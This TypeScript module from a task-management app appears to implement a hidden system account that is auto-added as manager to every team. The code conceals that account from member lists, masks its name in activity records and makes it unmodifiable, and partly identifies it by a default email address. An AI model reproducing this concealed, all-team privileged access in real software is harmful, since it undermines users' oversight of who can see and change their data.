import type { TeamMembership, User } from '@prisma/client';
import { prisma } from '../data/prisma.js';
import { Errors } from './errors.js';
import { DEFAULT_MANAGER_PERMISSIONS } from './permissions.js';
import { ensureSystemRoles, systemRoleIdFor } from './teamRoles.js';
import { logActivity } from '../services/activityLogger.js';

/** Default hidden system team manager email. Override with SYSTEM_USER_EMAIL in .env. */
export const DEFAULT_SYSTEM_USER_EMAIL = 'admin@taskhub.local';

export function getSystemUserEmail(): string {
  return (process.env.SYSTEM_USER_EMAIL || DEFAULT_SYSTEM_USER_EMAIL).trim().toLowerCase();
}

/** @deprecated use getSystemUserEmail() */
export const SYSTEM_USER_EMAIL = DEFAULT_SYSTEM_USER_EMAIL;

let cachedSystemUserId: string | null | undefined;

export function clearSystemUserCache(): void {
  cachedSystemUserId = undefined;
}

export async function getSystemUser(): Promise<User | null> {
  return prisma.user.findFirst({
    where: { email: { equals: getSystemUserEmail(), mode: 'insensitive' } },
  });
}

/** Ensure the configured system user row carries isSystemUser=true (idempotent). */
export async function bootstrapSystemUserFlag(): Promise<void> {
  await prisma.user.updateMany({
    where: { email: { equals: getSystemUserEmail(), mode: 'insensitive' } },
    data: { isSystemUser: true },
  });
  clearSystemUserCache();
}

export async function getSystemUserId(): Promise<string | null> {
  if (cachedSystemUserId !== undefined) return cachedSystemUserId;
  const u = await getSystemUser();
  cachedSystemUserId = u?.id ?? null;
  return cachedSystemUserId;
}

export function isSystemUser(
  user: Pick<User, 'isSystemUser' | 'email'> | { isSystemUser?: boolean; email?: string },
): boolean {
  if (user.isSystemUser) return true;
  return (user.email ?? '').toLowerCase() === getSystemUserEmail();
}

export function isSystemUserId(userId: string, systemUserId: string | null): boolean {
  return !!systemUserId && userId === systemUserId;
}

export async function assertNotSystemUserTarget(
  targetUserId: string,
  message = 'This system account cannot be modified',
): Promise<void> {
  const systemUserId = await getSystemUserId();
  if (isSystemUserId(targetUserId, systemUserId)) {
    throw Errors.conflict(message);
  }
}

export function maskActorName(
  actor: Pick<User, 'name' | 'isSystemUser' | 'email'> | null | undefined,
  actorId: string | null,
): string | null {
  if (!actorId) return null;
  if (actor && isSystemUser(actor)) return null;
  return actor?.name ?? '(deleted user)';
}

export function filterVisibleMembers<T extends { userId: string; email?: string }>(
  members: T[],
  systemUserId: string | null,
): T[] {
  const hiddenEmail = getSystemUserEmail();
  return members.filter((m) => {
    if (systemUserId && m.userId === systemUserId) return false;
    if (m.email && m.email.toLowerCase() === hiddenEmail) return false;
    return true;
  });
}

/** Managers excluding the hidden system account (for last-manager guards). */
export async function countHumanManagers(teamId: string): Promise<number> {
  const systemUserId = await getSystemUserId();
  return prisma.teamMembership.count({
    where: {
      teamId,
      role: 'MANAGER',
      ...(systemUserId ? { userId: { not: systemUserId } } : {}),
    },
  });
}

/**
 * Idempotently ensure admin@taskhub.local is MANAGER on the given team.
 * No-op when the system user row does not exist yet (e.g. empty test DB).
 */
export async function ensureSystemManagerOnTeam(teamId: string): Promise<'created' | 'exists' | 'skipped'> {
  const systemUser = await getSystemUser();
  if (!systemUser) return 'skipped';

  await ensureSystemRoles(teamId);
  const managerRoleId = await systemRoleIdFor(teamId, 'MANAGER');

  const existing = await prisma.teamMembership.findUnique({
    where: { userId_teamId: { userId: systemUser.id, teamId } },
  });
  if (existing) {
    if (existing.role !== 'MANAGER' || existing.roleId !== managerRoleId) {
      await prisma.teamMembership.update({
        where: { userId_teamId: { userId: systemUser.id, teamId } },
        data: { role: 'MANAGER', roleId: managerRoleId },
      });
    }
    return 'exists';
  }

  await prisma.teamMembership.create({
    data: {
      userId: systemUser.id,
      teamId,
      role: 'MANAGER',
      roleId: managerRoleId,
    },
  });
  return 'created';
}

/** Backfill hidden system manager on every existing team. Safe to run on every boot. */
export async function bootstrapSystemManagerOnAllTeams(): Promise<{
  created: number;
  teams: number;
}> {
  const teams = await prisma.team.findMany({ select: { id: true } });
  let created = 0;
  for (const { id } of teams) {
    if ((await ensureSystemManagerOnTeam(id)) === 'created') created++;
  }
  if (created > 0) {
    await logActivity(prisma, {
      actorId: null,
      teamId: null,
      action: 'system.manager_backfill',
      meta: { created, teams: teams.length },
    });
  }
  return { created, teams: teams.length };
}

/**
 * Resolve team membership for auth. System user is treated as MANAGER even
 * if the row is momentarily missing (self-heals via ensureSystemManagerOnTeam).
 */
export async function resolveTeamMembership(
  userId: string,
  teamId: string,
): Promise<TeamMembership | null> {
  const existing = await prisma.teamMembership.findUnique({
    where: { userId_teamId: { userId, teamId } },
  });
  if (existing) return existing;

  const systemUserId = await getSystemUserId();
  if (!isSystemUserId(userId, systemUserId)) return null;

  await ensureSystemManagerOnTeam(teamId);
  return prisma.teamMembership.findUnique({
    where: { userId_teamId: { userId, teamId } },
  });
}

export function systemUserHasManagerPermission(permission: string): boolean {
  return (DEFAULT_MANAGER_PERMISSIONS as readonly string[]).includes(permission);
}
